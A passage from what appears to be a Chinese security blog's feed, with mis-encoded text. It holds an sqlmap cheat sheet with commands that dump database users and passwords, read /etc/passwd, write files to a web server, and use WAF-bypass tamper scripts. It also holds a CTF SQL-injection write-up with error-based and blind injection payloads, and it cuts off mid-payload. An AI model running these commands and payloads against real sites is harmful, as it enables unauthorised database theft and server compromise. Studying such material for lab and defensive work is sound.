class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> --sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v 1 </span><br><span class="line">20./sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --string=<span class="string">&#x27;xx&#x27;</span> --dbs --level=3 -p <span class="string">&quot;uid&quot;</span></span><br><span class="line"></span><br><span class="line">ç®€å•çš„æ³¨å…¥æµç¨‹ :</span><br><span class="line">1.è¯»å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U ç”¨æˆ·å -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U ç”¨æˆ·å -v 1 </span><br><span class="line">3.è¯»å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·æˆ–æŒ‡å®šæ•°æ®åº“ç”¨æˆ·çš„å¯†ç  </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --<span class="built_in">users</span> --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.è·å–æ‰€æœ‰æ•°æ®åº“ </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨çš„å­—æ®µ </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T <span class="built_in">users</span> -v 2 </span><br><span class="line">7.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨ä¸­æŒ‡å®šå­—æ®µçš„æ•°æ® </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T <span class="built_in">users</span> -C <span class="string">&quot;username,password&quot;</span> -s <span class="string">&quot;sqlnmapdb.log&quot;</span> -v 2 </span><br><span class="line">8.file-readè¯»å–webæ–‡ä»¶ </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read <span class="string">&quot;/etc/passwd&quot;</span> -v 2 </span><br><span class="line">9.file-writeå†™å…¥æ–‡ä»¶åˆ°web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --fileä½¿ç”¨sqlmapç»•è¿‡é˜²ç«å¢™è¿›è¡Œæ³¨å…¥æµ‹è¯•</span><br></pre></td></tr></table></figure><h1 id="sqlmap-å¸¸ç”¨ç»•è¿‡è„šæœ¬"><a href="#sqlmap-å¸¸ç”¨ç»•è¿‡è„šæœ¬" class="headerlink" title="sqlmap å¸¸ç”¨ç»•è¿‡è„šæœ¬"></a>sqlmap å¸¸ç”¨ç»•è¿‡è„šæœ¬</h1><p>ä½¿ç”¨æ–¹æ³• <code>--tamper xxx.py</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py                         ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py                   ç”¨éæ³•åŒå­—èŠ‚unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</span><br><span class="line"></span><br><span class="line">appendnullbyte.py                         åœ¨payloadæœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ç¼–ç </span><br><span class="line"></span><br><span class="line">base64encode.py                           å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨Base64ç¼–ç </span><br><span class="line"></span><br><span class="line">between.py                                åˆ†åˆ«ç”¨â€œNOT BETWEEN 0 AND </span><br><span class="line"><span class="comment">#â€æ›¿æ¢å¤§äºå·â€œ&gt;â€ï¼Œâ€œBETWEEN # AND #â€æ›¿æ¢ç­‰äºå·â€œ=â€</span></span><br><span class="line"></span><br><span class="line">bluecoat.py              åœ¨SQLè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨â€œLIKEâ€æ›¿æ¢ç­‰äºå·â€œ=â€</span><br><span class="line"></span><br><span class="line">chardoubleencode.py      å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line"></span><br><span class="line">charencode.py            å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line"></span><br><span class="line">charunicodeencode.py     å¯¹ç»™å®šçš„payloadçš„éç¼–ç å­—ç¬¦ä½¿ç”¨Unicode ç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line"></span><br><span class="line">concat2concatws.py  ç”¨â€œCONCAT_WS(MID(CHAR(0), 0, 0), A,B)â€æ›¿æ¢åƒâ€œCONCAT(A, B)â€çš„å®ä¾‹</span><br><span class="line"></span><br><span class="line">equaltolike.py          ç”¨â€œLIKEâ€è¿ç®—ç¬¦æ›¿æ¢å…¨éƒ¨ç­‰äºå·â€œ=â€</span><br><span class="line"></span><br><span class="line">greatest.py             ç”¨â€œGREATESTâ€å‡½æ•°æ›¿æ¢å¤§äºå·â€œ&gt;â€</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py         åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ MySQLæ³¨é‡Š</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py                   ç”¨â€œIF(ISNULL(A), B, A)â€æ›¿æ¢åƒâ€œIFNULL(A, B)â€çš„å®ä¾‹</span><br><span class="line"></span><br><span class="line">lowercase.py                         ç”¨å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py              ç”¨æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</span><br><span class="line"></span><br><span class="line">modsecurityzeroversioned.py          ç”¨å½“ä¸­å¸¦æœ‰æ•°å­—é›¶çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</span><br><span class="line"></span><br><span class="line">multiplespaces.py                    åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py           ç”¨representationsæ›¿æ¢é¢„å®šä¹‰SQLå…³é”®å­—ï¼Œé€‚ç”¨äºè¿‡æ»¤å™¨</span><br><span class="line"></span><br><span class="line">overlongutf8.py                      è½¬æ¢ç»™å®šçš„payloadå½“ä¸­çš„æ‰€æœ‰å­—ç¬¦</span><br><span class="line"></span><br><span class="line">percentage.py                        åœ¨æ¯ä¸ªå­—ç¬¦ä¹‹å‰æ·»åŠ ä¸€ä¸ªç™¾åˆ†å·</span><br><span class="line"></span><br><span class="line">randomcase.py                        éšæœºè½¬æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦çš„å¤§å°å†™</span><br><span class="line"></span><br><span class="line">randomcomments.py                    å‘SQLå…³é”®å­—ä¸­æ’å…¥éšæœºæ³¨é‡Š</span><br><span class="line"></span><br><span class="line">securesphere.py                      æ·»åŠ ç»è¿‡ç‰¹æ®Šæ„é€ çš„å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">sp_password.pyå‘payloadæœ«å°¾æ·»åŠ â€œsp_passwordâ€ <span class="keyword">for</span> automatic obfuscation from DBMS logs</span><br><span class="line"></span><br><span class="line">space2comment.py                     ç”¨â€œ//â€æ›¿æ¢ç©ºæ ¼ç¬¦**</span><br><span class="line"></span><br><span class="line">space2dash.py                     ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">space2hash.py                     ç”¨ç£…æ³¨é‡Šç¬¦â€œ<span class="comment">#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span></span><br><span class="line"></span><br><span class="line">space2morehash.py                 ç”¨ç£…æ³¨é‡Šç¬¦â€œ<span class="comment">#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span></span><br><span class="line"></span><br><span class="line">space2mssqlblank.py               ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py                ç”¨ç£…æ³¨é‡Šç¬¦â€œ<span class="comment">#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span></span><br><span class="line"></span><br><span class="line">space2mysqlblank.py               ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">space2mysqldash.py                ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">space2plus.py                     ç”¨åŠ å·â€œ+â€æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">space2randomblank.py              ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">unionalltounion.py                ç”¨â€œUNION SELECTâ€æ›¿æ¢â€œUNION ALL SELECTâ€</span><br><span class="line"></span><br><span class="line">unmagicquotes.py                  ç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line"></span><br><span class="line">varnish.py                        æ·»åŠ ä¸€ä¸ªHTTPå¤´â€œX-originating-IPâ€æ¥ç»•è¿‡WAF</span><br><span class="line"></span><br><span class="line">versionedkeywords.py              ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªéå‡½æ•°å…³é”®å­—</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py          ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªå…³é”®å­—</span><br><span class="line"></span><br><span class="line">xforwardedfor.py                  æ·»åŠ ä¸€ä¸ªä¼ªé€ çš„HTTPå¤´â€œX-Forwarded-Forâ€æ¥ç»•è¿‡WAF</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqlmap-å¸¸ç”¨æŒ‡ä»¤&quot;&gt;&lt;a href=&quot;#sqlmap-å¸¸ç”¨æŒ‡ä»¤&quot; class=&quot;headerlink&quot; title=&quot;sqlmap å¸¸ç”¨æŒ‡ä»¤&quot;&gt;&lt;/a&gt;sqlmap å¸¸ç”¨æŒ‡ä»¤&lt;/h1&gt;&lt;p&gt;SQLMap æ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–çš„SQLæ³¨å…¥æµ‹è¯•å·¥å…·ï¼Œåœ¨ kali ä¸Šå·²é›†</summary>
      
    
    
    
    <category term="Web" scheme="https://iahzl.github.io/categories/Web/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="https://iahzl.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqlmap" scheme="https://iahzl.github.io/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)</title>
    <link href="https://iahzl.github.io/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
    <id>https://iahzl.github.io/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</id>
    <published>2023-08-06T02:30:31.000Z</published>
    <updated>2023-08-06T02:33:12.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¾‹é¢˜-æ‰‹å·¥æ³¨å…¥"><a href="#ä¾‹é¢˜-æ‰‹å·¥æ³¨å…¥" class="headerlink" title="ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)"></a>ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)</h1><h3 id="ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥-ctfhub"><a href="#ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥-ctfhub" class="headerlink" title="ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥(ctfhub)"></a>ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥(ctfhub)</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202120498-1691289107543-2.png" alt="image-20230714202120498"></p><p>æŠ¥é”™æ³¨å…¥ï¼šé¦–å…ˆæƒ³åˆ° <code>updatexml</code> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202501659-1691289107544-4.png" alt="image-20230714202501659"></p><p>æ­¤æ—¶æŸ¥è¯¢åˆ°æ•°æ®åº“åï¼šsqli</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;sqli&quot;),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202632846-1691289107544-5.png" alt="image-20230714202632846"></p><p>æŸ¥è¯¢åˆ°è¡¨åï¼šflag è¿›è€ŒæŸ¥è¯¢åˆ—åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;flag&quot;),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202802542-1691289107543-1.png" alt="image-20230714202802542"></p><p>æœ€åæŸ¥è¯¢ åˆ—åä¸º flag çš„ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202857595-1691289107544-3.png" alt="image-20230714202857595"></p><h3 id="ä¾‹é¢˜2ï¼šå¸ƒå°”ç›²æ³¨-ctfhub"><a href="#ä¾‹é¢˜2ï¼šå¸ƒå°”ç›²æ³¨-ctfhub" class="headerlink" title="ä¾‹é¢˜2ï¼šå¸ƒå°”ç›²æ³¨(ctfhub)"></a>ä¾‹é¢˜2ï¼šå¸ƒå°”ç›²æ³¨(ctfhub)</h3><blockquote><ol><li><code>substr(str,from,length)</code>:è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚<strong>å…¶ä¸­ï¼Œé¦–å­—ç¬¦ä¸‹æ ‡ä¸º1</strong></li><li><code>length(str)</code>:è¿”å›strä¸²é•¿åº¦</li></ol></blockquote><p><strong>1. é¦–å…ˆ  <code> çˆ†æ•°æ®åº“åé•¿åº¦</code> ä½¿ç”¨<code>length(database()) = i</code> è·å–æ•°æ®åº“åçš„é•¿åº¦</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210008799.png" alt="image-20230714210008799"></p><p><strong>2. æ ¹æ®æ•°æ®åº“åé•¿åº¦çˆ†åº“å ä½¿ç”¨ <code> substr(database(),i,1)</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>â€˜aâ€™</span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>â€˜sâ€™</span><br><span class="line">#query_success</span><br><span class="line">#åº“åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯s</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span>â€˜iâ€™</span><br><span class="line">#query_success</span><br><span class="line">#åº“åç¬¬å››ä¸ªå­—ç¬¦æ˜¯i</span><br><span class="line"></span><br><span class="line">#åº“åæ˜¯sqli</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210628752.png" alt="image-20230714210628752"></p><p><strong>3. è·å–æ•°æ®åº“å†…çš„è¡¨æ•°é‡ï¼Œä½¿ç”¨mysqlçš„æŸ¥è¯¢è¯­å¥<code>select COUNT(*)</code>ã€‚åŒæ ·ï¼Œè¦ä¸€ä¸ª1åˆ°æ— ç©·çš„å¾ªç¯</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliæœ‰<span class="number">2</span>å¼ è¡¨</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714211308430.png" alt="image-20230714211308430"></p><p><strong>4. ä½¿ç”¨<code>limit i ,1</code>é™å®šæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œå†…åµŒå¾ªç¯jä»1åˆ°æ— ç©·ï¼ˆç©·ä¸¾æ‰€æœ‰è¡¨åé•¿åº¦å¯èƒ½æ€§ï¼‰å°è¯•è·å–æ¯ä¸ªè¡¨çš„è¡¨åé•¿åº¦</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliçš„ç¬¬ä¸€å¼ è¡¨è¡¨åé•¿åº¦ä¸º<span class="number">4</span></span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliçš„ç¬¬äºŒå¼ è¡¨è¡¨åé•¿åº¦ä¸º<span class="number">4</span></span><br><span class="line"></span><br><span class="line">#å½“å‰åº“sqliæœ‰ä¸¤å¼ è¡¨â€™newsâ€™å’Œâ€™flagâ€˜ï¼Œè¡¨åé•¿åº¦å‡ä¸º<span class="number">4</span></span><br></pre></td></tr></table></figure><p>è¡¨åé•¿åº¦çˆ†è¡¨å<code>substr((selectâ€¦limit i,1),j,1)</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;n&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliçš„ç¬¬ä¸€å¼ è¡¨è¡¨åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯n</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliçš„ç¬¬äºŒå¼ è¡¨è¡¨åçš„ç¬¬å››ä¸ªå­—ç¬¦æ˜¯g</span><br><span class="line"></span><br><span class="line">#å½“å‰åº“sqliæœ‰ä¸¤å¼ è¡¨â€™newsâ€˜å’Œâ€˜flagâ€™</span><br></pre></td></tr></table></figure><ol start="6"><li>å¯¹è¡¨çˆ†åˆ—æ•°é‡</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">2</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliè¡¨flagçš„åˆ—æ•°ä¸º<span 